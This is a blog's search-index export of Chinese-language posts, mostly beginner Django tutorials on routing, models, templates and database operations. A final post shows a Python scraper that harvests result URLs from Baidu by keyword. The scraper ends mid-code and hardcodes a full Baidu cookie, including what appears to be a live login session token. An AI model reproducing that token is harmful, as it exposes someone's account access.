<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Django之MTV框架模式（二）</title>
    <url>/2020/05/07/DjangoMTV2/</url>
    <content><![CDATA[<h3 id="View（视图层）"><a href="#View（视图层）" class="headerlink" title="View（视图层）"></a>View（视图层）</h3><p>视图（View），即业务逻辑层。主要的职责是：存取模型及调取恰当模板的相关逻辑。模型与模板的桥梁。通俗来讲是用来接受Web请求，并做出响应。<a id="more"></a></p>
<h4 id="urls"><a href="#urls" class="headerlink" title="urls"></a>urls</h4><p><img src="/images/django1/2.png" alt=""></p>
<p>url()函数：可以接收四个参数，分别是两个必选参数regex、view 和两个可选参数kwargs、name：</p>
<pre><code>regex：正则表达式，与之匹配的 URL 会执行对应的第二个参数 view。

view：用于执行与正则表达式匹配的 URL 请求。

kwargs：视图使用的字典类型的参数。

name：用来反向获取 URL。</code></pre><p>这里以一个简单的小例子:</p>
<pre><code># 创建一个新的app
python manage.py startapp view
# sttings.py注册
INSTALLED_APPS = [
    &apos;view.apps.ViewConfig&apos;,
]
# urls.py导入
urlpatterns = [
url(r&apos;^view/&apos;, include(&apos;view.urls&apos;)),
]
# 创建view/urls.py
urlpatterns = [
url(r&apos;^index/&apos;, views.index)
]
# 测试
def index(request):
    return HttpResponse(&quot;view&quot;)</code></pre><p><img src="/images/django1/1.png" alt=""><br>创建完成之后，测试一下。</p>
<h5 id="路由器-regex"><a href="#路由器-regex" class="headerlink" title="路由器(regex)"></a>路由器(regex)</h5><pre><code>按照列表的书写顺序进行匹配的
从上到下匹配，没有最优匹配的概念</code></pre><p>例如：</p>
<pre><code>urlpatterns = [
    url(r&apos;^index&apos;, views.index),
    url(r&apos;^indexs&apos;, views.indexs),
]

url1:http://127.0.0.1:8000/view/indexs/
url2:http://127.0.0.1:8000/view/index/</code></pre><p>我访问上面两个url，返回的都是URL2的内容，</p>
<p>正确的应该以下面规则编写：</p>
<pre><code># 路由规则编写
我们通常直接指定以 ^ 开头
在结尾处直接添加反斜线</code></pre><h5 id="路由路径中的参数使用-进行获取"><a href="#路由路径中的参数使用-进行获取" class="headerlink" title="路由路径中的参数使用 () 进行获取"></a>路由路径中的参数使用 () 进行获取</h5><pre><code>一个圆括号对应视图函数中的一个参数</code></pre><p>路径参数</p>
<pre><code># 匹配一个数字参数
urlpatterns = [
    url(r&apos;^index/(\d+)/&apos;, views.index),
]
# 用s_id来接收参数
def index(request,s_id):
    print(s_id)
    print(type(s_id))
    return HttpResponse(&quot;view&quot;)</code></pre><p>1、位置参数</p>
<p>例如:</p>
<pre><code>urlpatterns = [
    url(r&apos;^index/(\d+)/(\d+)/(\d+)/&apos;, views.index),
]
# 按照书写顺序进行匹配
def index(request, yeas, moth, day):
    print(yeas, &quot;-&quot;, moth, &quot;-&quot;, day)
    return HttpResponse(&quot;Time:{yeas}-{moth}-{day}&quot;.format(yeas=yeas, moth=moth, day=day))</code></pre><p>上面用三个参数（yeas, moth, day），来接收年月日</p>
<p>2、关键字参数</p>
<pre><code># 关键字参数写法
url(r&apos;^index/(?P&lt;yeas&gt;\d+)/(?P&lt;moth&gt;\d+)/(?P&lt;day&gt;\d+)/&apos;, views.index, name=&apos;getdate&apos;),
# 按照参数名称匹配，和顺序就无关了
def index(request, yeas, moth, day):
    return HttpResponse(&quot;Time:{yeas}-{moth}-{day}&quot;.format(yeas=yeas, moth=moth, day=day))</code></pre><p>参数个数必须和视图函数中参数个数一致（除默认的request以外）</p>
<h5 id="反向解析"><a href="#反向解析" class="headerlink" title="反向解析"></a>反向解析</h5><pre><code>根据根路由中注册的namespace和在子路由中注册name，这两个参数来动态获取我们的路径
在模板中使用  {% url 'namespace:name'  %}
如果带有位置参数  {% url 'namespace:name'  value1 value2 [valuen...] %}
如果带有关键字参数  {% url 'namespace:name' key1=value1 key2=value2 [keyn=valuen....] %}</code></pre><p>后记：</p>
<p>最初的想法是做一个自己写的工具后台，所以Django的MTV就先学到这里，后续有需要的话，再去学习，查看文档或者google解决问题吧。</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django之MTV框架模式（一）</title>
    <url>/2020/05/06/DjangoMTV1/</url>
    <content><![CDATA[<h2 id="MTV框架模式"><a href="#MTV框架模式" class="headerlink" title="MTV框架模式"></a>MTV框架模式</h2><p>众所周知，一般的Web开发都会遵循 MVC 设计模式的框架。MVC是Model、View、Controller三个单词的简写，分别代表模型、视图、控制器。Django采用了MTV的框架模式，即模型M，模板T和视图V。</p>
<a id="more"></a>

<p>本篇博客主要是入门Django的MTV模式展开的。如果你也是Django初学者的话可能会对你有帮助。</p>
<h3 id="Models-模型层"><a href="#Models-模型层" class="headerlink" title="Models(模型层)"></a>Models(模型层)</h3><blockquote>
<p>模型（Model），即数据存取层。主要的职则是：处理与数据相关的所有事务： 如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。</p>
</blockquote>
<p>Django对各种数据库都提供了很好的支持，对不同的数据库，Django提供了统一调用的API，我们可以根据不同的业务需求使用不同的数据库。</p>
<p>下面一个简单的例子展开：</p>
<p>（数据库采用mysql；python的数据库操作引擎采用pymsql伪装）</p>
<h4 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h4><p>创建project和app</p>
<pre><code>source venv/django/bin/activate
django-admin startproject djmodels
cd djmodels/
python manage.py startapp app
# 设置pycharm环境
File -&gt;Setting -&gt;Project -&gt;Python Interpreter</code></pre><p>配置djmodels/setting.py</p>
<pre><code># 导入APP
INSTALLED_APPS = [
    &apos;django.contrib.admin&apos;,
    &apos;django.contrib.auth&apos;,
    &apos;django.contrib.contenttypes&apos;,
    &apos;django.contrib.sessions&apos;,
    &apos;django.contrib.messages&apos;,
    &apos;django.contrib.staticfiles&apos;,
    &apos;app.apps.AppConfig&apos;,
]
# 数据库配置
DATABASES = {
    &apos;default&apos;: {
        # &apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;,
        # &apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;),
        # mysql数据库连接
        &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,
        &apos;NAME&apos;: &apos;djmodels&apos;,
        &apos;USER&apos;: &apos;root&apos;,
        &apos;PASSWORD&apos;: &apos;passwd&apos;,
        &apos;HOST&apos;: &apos;localhost&apos;,
        &apos;PORT&apos;: &apos;3306&apos;,
    }
}
# templates文件夹配置，用来放置前端等文件
TEMPLATES = [
    {
        &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;,
        # 添加templates在djmodels/templates
        &apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)],
        &apos;APP_DIRS&apos;: True,
        &apos;OPTIONS&apos;: {
            &apos;context_processors&apos;: [
                &apos;django.template.context_processors.debug&apos;,
                &apos;django.template.context_processors.request&apos;,
                &apos;django.contrib.auth.context_processors.auth&apos;,
                &apos;django.contrib.messages.context_processors.messages&apos;,
            ],
        },
    },
]

# 语言和地区
LANGUAGE_CODE = &apos;zh-hans&apos;

TIME_ZONE = &apos;Asia/Shanghai&apos;</code></pre><p>配置djmodels/<strong>init</strong>.py</p>
<pre><code>import pymysql

pymysql.install_as_MySQLdb()    # pymysql伪装MySQLdb</code></pre><p>数据库变更生成</p>
<pre><code>python manage.py makemigrations
python manage.py migrate</code></pre><h4 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h4><p>在进行定义模型之前需要先了解一下是ORM</p>
<blockquote>
<p>ORM(Object Relational Mapping)对象关系映射，是一种程序技术，用于实现面向对象编程语言里不同类型系统的数据之间的转换。<br>可以简单理解为翻译机。</p>
</blockquote>
<p>app/models.py</p>
<pre><code>from django.db import models
# 创建一个Person类继承自Model
class Person(models.Model):
    p_name = models.CharField(max_length=16, unique=True)    # unique设置为True，表示字段在表中必须唯一
    p_age = models.IntegerField(default=18, db_column=&apos;age&apos;)    # d_column自定义数据库column的名称
    # False Representative MAN ,True Representative WONAN
    p_sex = models.BooleanField(default=False, db_column=&apos;sex&apos;)

    class Meta: # 
        db_table = &apos;Peopel&apos;    # 自定义数据库表的名称</code></pre><p>更多参考：<br><a href="https://docs.djangoproject.com/zh-hans/3.0/ref/models/fields/" target="_blank" rel="noopener">字段类型</a>|<a href="https://docs.djangoproject.com/zh-hans/3.0/ref/models/options/" target="_blank" rel="noopener">Meta选项</a></p>
<p>数据库操作 参考上一篇博客（<a href="https://aqyoung.github.io/2020/05/04/DjangoDatabase/#more">django之数据操作</a>）</p>
<h4 id="模型成员objects"><a href="#模型成员objects" class="headerlink" title="模型成员objects"></a>模型成员objects</h4><h5 id="1、URL简单配置"><a href="#1、URL简单配置" class="headerlink" title="1、URL简单配置"></a>1、URL简单配置</h5><p>在djmodels/urls.py配置</p>
<pre><code>urlpatterns = {
    url(r&apos;^admin/&apos;, admin.site.urls),
    url(r&apos;^app/&apos;, include(&apos;app.urls&apos;)),    # 新增配置
}</code></pre><p>之后创建app/urls.py</p>
<pre><code>from django.conf.urls import url
from app import views

urlpatterns = {
    url(r&apos;^addperson/&apos;, views.add_persons),
}</code></pre><p>通过上面的配置之后我们就可以访问: localhost:8000/app/addperson 来访问网页了</p>
<p>更多参考：<a href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/urls/" target="_blank" rel="noopener">URL调度</a></p>
<h5 id="2、数据添加"><a href="#2、数据添加" class="headerlink" title="2、数据添加"></a>2、数据添加</h5><pre><code>import random

from django.http import HttpResponse
from django.shortcuts import render

# Create your views here.
from app.models import Person

# add随机的数据
def add_persons(request):
    for i in range(20):
        person = Person()
        num = random.randrange(1000)
        person.p_name = &quot;aqyoung{num}&quot;.format(num=num)
        person.p_age = num
        person.p_sex = num % 2
        person.save()

    return HttpResponse(&quot;add sucess&quot;)</code></pre><h5 id="3、fillter-amp-amp-exclude-过滤器"><a href="#3、fillter-amp-amp-exclude-过滤器" class="headerlink" title="3、fillter&amp;&amp;exclude 过滤器"></a>3、fillter&amp;&amp;exclude 过滤器</h5><p>fillter()    返回符合条件的数据</p>
<p>exclude()    过滤掉符合条件的数据</p>
<p>创建templates/person_list</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;PersonList&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;ul&gt;
    {% for person in persons %}
	        <li>姓名{{ person.p_name }} 年龄{{person.p_age}}</li>
	    {% endfor %}
&lt;/ul&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p>按照之前的方法新添加URL规则之后</p>
<p>编写views.py</p>
<pre><code>def get_persons(request):
    # persons = Person.objects.filter(p_age__gt=50).filter(p_age__lt=500)    # 1
    persons = Person.objects.exclude(p_age__gt=50).filter(p_age__lt=60)    # 2 
    context = {
        &quot;persons&quot;: persons
    }

    return render(request, &apos;person_list.html&apos;, context=context)</code></pre><p>fillter表示筛选出符合规则的数据，而exclude表示排除符合规则的数据</p>
<p>所以:如1表示 筛选 p_age&gt;=50 and p_age&lt;=500 的数据</p>
<p>如2表示 排除    a_age&gt;=50(a&lt;50)and p_age&lt;=60 的数据</p>
<h5 id="4、Model中自定义crete用来增加默认值"><a href="#4、Model中自定义crete用来增加默认值" class="headerlink" title="4、Model中自定义crete用来增加默认值"></a>4、Model中自定义crete用来增加默认值</h5><p>在app/models的Person类添加如下代码</p>
<pre><code>p_hobby = models.CharField(max_length=32, null=True, blank=True)

@classmethod
def create(cls, p_name, p_page=20, p_sex=True, p_hobby=&apos;hanppy&apos;):
    return cls(p_name=p_name, p_age=p_page, p_sex=p_sex, p_hobby=p_hobby)</code></pre><p>之后修改在app/views.py添加如下代码</p>
<pre><code>def add_person(request):
    person = Person.create(&apos;lalalal&apos;)
    person.save()
    return HttpResponse(&quot;create sucess&quot;)</code></pre><p>记得重新迁移数据库</p>
<h5 id="5、all-amp-amp-order-by-amp-amp-values-过滤器"><a href="#5、all-amp-amp-order-by-amp-amp-values-过滤器" class="headerlink" title="5、all&amp;&amp;order_by&amp;&amp;values 过滤器"></a>5、all&amp;&amp;order_by&amp;&amp;values 过滤器</h5><pre><code>def get_person(request):

    person_all = Person.objects.all()        # 返回所有数据
    person_order = Person.objects.order_by(&apos;p_age&apos;)        # 排序.默认以id排序，这里指定p_age
    person_values = Person.objects.values()            # 一条数据就是一个字典，返回一个列表
    person_get = Person.objects.get(p_name=&quot;qq&quot;)    # 参数说明 1
    # print(type(person))
    # print(person)
    # for personz in person:
    #     print(personz)

    context ={
        &quot;persons&quot;: person_all
    }

    return render(request, &apos;preson.html&apos;, context=context)</code></pre><p>参数说明：</p>
<p>get()</p>
<pre><code>查询条件没有匹配的对象，会抛异常，DoesNotExist
如果查询条件对应多个对象，会抛异常，MultipleObjectsReturned</code></pre><p>fist()、last()</p>
<p>默认情况下可以正常从QuerySet中获取<br>隐藏bug</p>
<pre><code>可能会出现first和last获取到的是相同的对象
解决方法：显式，手动写排序规则</code></pre><p>count()、exists()</p>
<p>count用来计数、exists判断是否存</p>
<h4 id="Templates-模板层"><a href="#Templates-模板层" class="headerlink" title="(Templates) 模板层"></a>(Templates) 模板层</h4><p>模板(Template)，即表现层。主要的职责：处理与表现相关的决定： 如何在页面或其他类型文档中进行显示。</p>
<p>在Django框架中，模板是可以帮助开发者快速生成呈现给用户页面的工具</p>
<p>模板主要有两个部分：</p>
<pre><code>① HTML静态代码
② 动态插入的代码段（挖坑，填坑）</code></pre><p>在之前的初始化配置中，已经创建templates目录用来存放html文件，下面列出一些常见的DJango模板标签</p>
<h5 id="Django-模板标签"><a href="#Django-模板标签" class="headerlink" title="Django 模板标签"></a>Django 模板标签</h5><p>1、模板中的点语法</p>
<pre><code>属性或者方法    student.gname
索引            student.0.gname</code></pre><p>2、if 标签</p>
<p>支持嵌套。标签接受and、or 或not关键字来对多个变量做判断，或对变量取反。</p>
<pre><code>{% if  condition %}
	    ...
	{% endif  %}</code></pre><p>或者</p>
<pre><code>{%  if condition %}
	    ...
	{% else  %}
	    ...
	{% endif %}</code></pre><p>或者</p>
<pre><code>{% if condition %}
        ...	
 	{% elif condition %}
        ...
	{% endif %}</code></pre><p>3、for 标签</p>
<p>允许在一个序列上迭代。支持嵌套。</p>
<pre><code>{% for person in persons %}
		<li> {{person.p_name}}
	       {% empty %}
		<li> sorry not find name <li>
	{% endfor %}</code></pre><p>当列表为空或不存在时,执行empty之后的语句</p>
<pre><code>{{ forloop.counter }} 表示当前是第几次循环，从1数数
{{ forloop.counter0}}表示当前是第几次循环，从0数数
{{ forloop.revcounter}}表示当前是第几次循环，倒着数数，到1停
{{ forloop.revcounter0}}表示当前第几次循环，倒着数，到0停
{{ forloop.first }} 是否是第一个 布尔值
{{ forloop.last }} 是否是最后一个 布尔值</code></pre><p>4、ifequal/ifnotequal 标签</p>
<p>ifequal 如果相等</p>
<pre><code>{%  ifequal  value1 value2 %}
		语句
	{% endifequal %}</code></pre><p>ifnotequal 如果不相等</p>
<p>注释标签</p>
<pre><code>单行注释


多行注释
    {% comment %}
			这是多行注释
		{% endcomment %}</code></pre><p>5、过滤器</p>
<p>模板过滤器可以在变量被显示前修改它，使用管道字符：</p>
<pre><code>{{ page | add : -5}} 没有减法过滤器，但是加法里可以加负数

{{ name|lower }} 大写转换为小写。

{{ name|first|upper }} 将第一个元素转化为大写。

{{ name|truncatewords:"3" }} 显示变量的前3个词。

addslashes：添加反斜杠到任何反斜杠、单引号或者双引号前面。

date：按指定的格式字符串参数格式化date或datetime对象，如{{ pub_date|date:"F j, Y" }}。

length：返回变量的长度。</code></pre><p>6、模板继承</p>
<pre><code>关键字block:挖坑
    {% block XXX%}
			code
		{% endblock %}

extends 继承，写在开头位置
    {% extends  '父模板路径' %}

include:    加载模板进行渲染
    格式{% include '模板文件' %}</code></pre><hr>
<p><strong>声明：</strong></p>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django之数据库操作</title>
    <url>/2020/05/04/DjangoDatabase/</url>
    <content><![CDATA[<p>Django实现数据库操作（增删改查）<a id="more"></a></p>
<h2 id="数据库配置（mysql）"><a href="#数据库配置（mysql）" class="headerlink" title="数据库配置（mysql）"></a>数据库配置（mysql）</h2><p>下面还是以上一篇为例（hellojango），之后python manage starapp two 创建一个新的app</p>
<p>实现student数据库的增删改查</p>
<p>1、配置”DATABASES”:</p>
<p>打开hellojango/setting.py。</p>
<p>找到DATABASES修改为如下代码：</p>
<pre><code>DATABASES = {
    &apos;default&apos;: {
        # &apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;,    # 原本默认连接sqlite
        # &apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;),
        &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,
        &apos;NAME&apos;: &apos;django&apos;,    # 需要创建一个库
        &apos;USER&apos;: &apos;root&apos;,
        &apos;PASSWORD&apos;: &apos;toor&apos;,
        &apos;HOST&apos;: &apos;192.168.11.15&apos;,
        &apos;PORT&apos;: &apos;3306&apos;,
    }
}</code></pre><p>2、安装数据库引擎（pymysql）</p>
<p>修改hellojango/<em>_init</em>.py</p>
<pre><code>import pymysql

pymysql.install_as_MySQLdb()</code></pre><h2 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h2><p>在 Django 里写一个数据库驱动的 Web 应用的第一步是定义模型 - 也就是数据库结构设计和附加的其它元数据。</p>
<p>Django遵循<a href="https://docs.djangoproject.com/zh-hans/3.0/misc/design-philosophies/#dry" target="_blank" rel="noopener">DRY</a>原则，所以我们只需要定义一下数据模型，其他都不用关系，下面创建一个Sudent模型：</p>
<pre><code>from django.db import models

# Create your models here.

class Student(models.Model):
    s_name = models.CharField(max_length=16)
    s_age = models.IntegerField(default=1)</code></pre><p>参数说明：<br>CharField    表示字符字段<br>IntegerField    表示int字段<br>除此之外还有：DateTimeField    表示日期时间字段，ImageField    表示图像字段等等。</p>
<h2 id="激活模型"><a href="#激活模型" class="headerlink" title="激活模型"></a>激活模型</h2><p>创建完成模型代码，之后需要激活模型，django会根据你的代码创建数据库表，比如上面会创建一个Student表，然后创建s_name、s_age两个字段</p>
<p>配置stting.py</p>
<pre><code>INSTALLED_APPS = [
    &apos;django.contrib.admin&apos;,
    &apos;django.contrib.auth&apos;,
    &apos;django.contrib.contenttypes&apos;,
    &apos;django.contrib.sessions&apos;,
    &apos;django.contrib.messages&apos;,
    &apos;django.contrib.staticfiles&apos;,
    &apos;two.apps.TwoConfig&apos;,    #添加在这里
    # &apos;two&apos;,
]</code></pre><p>在终端中输入：</p>
<pre><code>python manage.py migrate
python manage.py makemigrations</code></pre><h2 id="数据库操作具体实现"><a href="#数据库操作具体实现" class="headerlink" title="数据库操作具体实现"></a>数据库操作具体实现</h2><h3 id="新增数据"><a href="#新增数据" class="headerlink" title="新增数据"></a>新增数据</h3><p>urls.py</p>
<pre><code>from two import views
urlpatterns = [
    url(r&apos;^addstudent/&apos;, views.add_student),
]</code></pre><p>之后会提示没有add_student这个类，如果你是在pycharm中编写的话，可以用ALT+CTRL自动在 two/views.py自动创建这个类，完整代码如下：</p>
<pre><code>def add_student(request):
    student = Student()    #实例化一个student对象
    num = random.randint(0, 1000)
    student.s_name = &quot;yang {id}&quot;.format(id=num)    # 添加s._name
    student.s_age = num
    student.save()    # 保存

    return HttpResponse(&quot;add success&quot;)</code></pre><p>在此之后启动runserver，就可以访问localhost:8000/addstudent，看看数据库中有没有新增数据</p>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>urls.py</p>
<pre><code>from two import views
urlpatterns = [
    url(r&apos;^addstudent/&apos;, views.add_student),
    url(r&apos;^getstudent/&apos;, views.get_student),
]</code></pre><p>同样的创建一个get_student类</p>
<p>def get_student(request):<br>    students = Student.objects.all()    #查询所有数据<br>    for student in students:<br>        print(student.s_name)</p>
<pre><code>conntext = {
    &quot;students&quot;: students
}

# return HttpResponse(&quot;student list&quot;)
return render(request, &quot;index.html&quot;, context=conntext)</code></pre><p>由于我上面index.html,所以这里在two创建一个文件夹为templates用来存放index.html</p>
<p>index.html代码如下:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;学生列表&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;ul&gt;
    {% for student in students %}
	        <li>{{student.s_name}}</li>
	    {% endfor %}

&lt;/ul&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre><h3 id="修改数据-amp-amp-删除数据"><a href="#修改数据-amp-amp-删除数据" class="headerlink" title="修改数据&amp;&amp;删除数据"></a>修改数据&amp;&amp;删除数据</h3><p>同样的在urls.py添加两条规则，以访问页面。</p>
<pre><code>from two import views
urlpatterns = [
    url(r&apos;^addstudent/&apos;, views.add_student),
    url(r&apos;^getstudent/&apos;, views.get_student),
    url(r&apos;^upstudent/&apos;, views.up_student),
url(r&apos;^destudent/&apos;,views.de_student),
]</code></pre><p>增加和删除都需要先查询数据，所以要给定”键值”，django默认id为主键</p>
<p>views.py新增如下代码：</p>
<pre><code>def up_student(request):

    student = Student.objects.get(pk=3)        #查询数据
    student.s_name=&apos;zhangsan&apos;    # 重新给字段赋值
    student.save()    #保存
    return HttpResponse(&quot;updata sucess&quot;)


def de_student(request):
    student = Student.objects.get(pk=4)    #查询数据
    student.delete()    #删除字段
    return HttpResponse(&quot;delete sucess&quot;)</code></pre><p>至此，Django中数据库的操作就到这来告一段落了，附上<a href="https://docs.djangoproject.com/zh-hans/3.0/intro/tutorial02/#activating-models" target="_blank" rel="noopener">官方文档</a></p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django之Hello-Jjango</title>
    <url>/2020/05/04/DjangoHello/</url>
    <content><![CDATA[<p>Django环境准备和实现hello-jango页面<a id="more"></a></p>
<h2 id="pycharm使用wsl中的virtualenv-搭建开发环境"><a href="#pycharm使用wsl中的virtualenv-搭建开发环境" class="headerlink" title="pycharm使用wsl中的virtualenv(搭建开发环境)"></a>pycharm使用wsl中的virtualenv(搭建开发环境)</h2><p>1、在linux中创建一个virtualenv环境</p>
<p>安装 virtualenv</p>
<pre><code>pip install virtualenv</code></pre><p>创建虚拟机环境</p>
<pre><code>virtualenv django</code></pre><p>进入虚拟环境</p>
<pre><code>source venv/django/bin/activate</code></pre><p>退出虚拟环境</p>
<pre><code>deactivate</code></pre><p><img src="/images/django/1.png" alt=""></p>
<p>2、配置pycharm</p>
<p>打开 pycharm -&gt; File -&gt; settings -&gt; project</p>
<p>选择add</p>
<p><img src="/images/django/2.png" alt=""></p>
<p>到linux系统查看一下当前路径</p>
<p><img src="/images/django/3.png" alt=""></p>
<p>在pycharm选择WSL之后在路径上加上python即可</p>
<p><img src="/images/django/4.png" alt=""></p>
<p>这样虚拟环境就配置好了，并且可以使用Windows的pycharm进行编写，又有linux的强命令行功能。</p>
<p><img src="/images/django/5.png" alt=""></p>
<h2 id="Django创建一个hellodjango"><a href="#Django创建一个hellodjango" class="headerlink" title="Django创建一个hellodjango"></a>Django创建一个hellodjango</h2><p>1、安装Django包</p>
<pre><code># 查看所有包和版本
(django) yang@wsl:~/python$ pip freeze
(django) yang@wsl:~/python$ pip list
# 安装特定版本的Django
(django) yang@wsl:~/python$ pip install django==1.11.7</code></pre><p><img src="/images/django/6.png" alt=""></p>
<p><img src="/images/django/7.png" alt=""></p>
<p>2、开始创建一个django</p>
<pre><code>django-admin starproject hellodjango</code></pre><p>创建完成之后我们查看一下文件夹，有如下文件<br><img src="/images/django/8.png" alt=""></p>
<p>如果要开发局具体的内容需要创建一个应用实现具体的代码逻辑</p>
<pre><code>python3 manage.py startapp app</code></pre><p><img src="/images/django/9.png" alt=""></p>
<p>运行server</p>
<pre><code>python3 manage.py runserver</code></pre><p><img src="/images/django/10.png" alt=""></p>
<p>虽然还没有写代码，但是已经可以运行起来，说明搭建没有问题<br><img src="/images/django/11.png" alt=""></p>
<p>3、实现自定义的hellodjango</p>
<p>注册一个路由</p>
<pre><code># 在 urls.py 
# urlpatterns列表添加如下代码：
url(r&apos;^hello/&apos;, views.hello),</code></pre><p>在views实现对应的视图函数</p>
<pre><code>def hello(request):
    return HttpResponse(&quot;&lt;h1&gt;hello django&lt;/h1&gt;&quot;)</code></pre><p><img src="/images/django/12.png" alt=""></p>
<p>最后效果如图所示</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>URL采集器模块</title>
    <url>/2020/05/01/URLcaiji/</url>
    <content><![CDATA[<p>编写各大搜索引擎的URL采集模块（baidu、bing、google）<a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间编写了几个URL采集模块，在这里小结一下，总体来说都是利用爬虫的原理，采集各大搜索引擎的url，主要是这些规则，可能会随着时间改变而改变</p>
<h1 id="URL采集器模块"><a href="#URL采集器模块" class="headerlink" title="URL采集器模块"></a>URL采集器模块</h1><h2 id="baidu采集模块"><a href="#baidu采集模块" class="headerlink" title="baidu采集模块"></a>baidu采集模块</h2><p>由于三个模块基本相同，而百度采集到的URL地址需要进行一个302的跳转，所以这里以百度模块来展开。</p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><pre><code># 默认采集前10页可以在下面更改
PAGES = 10

import requests
from lxml import etree
from urllib.parse import quote, urlparse
from concurrent.futures import ThreadPoolExecutor</code></pre><h3 id="开始编写采集模块"><a href="#开始编写采集模块" class="headerlink" title="开始编写采集模块"></a>开始编写采集模块</h3><pre><code>def BaiduScan(keywords):
    result = set()
    for i in range(0, PAGES*10, 10):
        url = &apos;https://www.baidu.com/s?wd={}&amp;pn={}&apos;.format(quote(keywords), i)
        print(&quot;正在采集第{}页，请耐心等待&quot;.format(int(i/10+1)))
        try:
            HEADERS = {
                &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,
                &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;,
                &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9,en;q=0.8&apos;,
                &apos;Cache-Control&apos;: &apos;max-age=0&apos;,
                &apos;Connection&apos;: &apos;keep-alive&apos;,
                &apos;Cookie&apos;: &apos;BAIDUID=832CF61CDAEF34C68E7CA06F591DF82A:FG=1; BIDUPSID=832CF61CDAEF34C68E7CA06F591DF82A; PSTM=1544962484; BD_UPN=12314753; BDUSS=RWclRJUURtR25qZWxKZWZiN0JuSlJVTWpKRjhvb3ROdmIyNnB0eEwwY2FVOWxjSVFBQUFBJCQAAAAAAAAAAAEAAADS9fNj0-~PxM600esAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABrGsVwaxrFcck; cflag=13%3A3; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; BD_HOME=1; delPer=0; BDRCVFR[feWj1Vr5u3D]=mk3SLVN4HKm; H_PS_PSSID=1453_21088_20692_28774_28720_28558_28832_28584; B64_BOT=1; BD_CK_SAM=1; PSINO=1; sug=3; sugstore=1; ORIGIN=2; bdime=0; H_PS_645EC=87ecpN5CzJjR5UwprsIowJPhqh6m9t1xGvxRkjeNmvcXBhI86ytKIjXLMhQ&apos;,
                &apos;Host&apos;: &apos;www.baidu.com&apos;,
                &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;,
            }
            HEADERS2 = {
                &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,
                &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9,en;q=0.8&apos;,
                &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;,
            }
            re = requests.get(url, headers=HEADERS, timeout=20)
            text = re.content.decode(&apos;utf-8&apos;)
            tree = etree.HTML(text)
            # 利用xpath 
            divs = tree.xpath(&quot;//div[@id=&apos;content_left&apos;]/div&quot;)
            for div in divs:
                urls = div.xpath(&quot;.//h3/a/@href&quot;)
                # print(urls)
                for url in urls:
                    r = requests.get(url=url, headers=HEADERS2, timeout=20)
                    if r.status_code == 200 or r.status_code == 302:
                        u = urlparse(r.url)
                        ur = u.scheme + &apos;://&apos; + u.netloc + u.path
                        print(ur)
                        result.add(ur)
        except Exception as e:
            pass
    if result != {}:
        for ur in result:
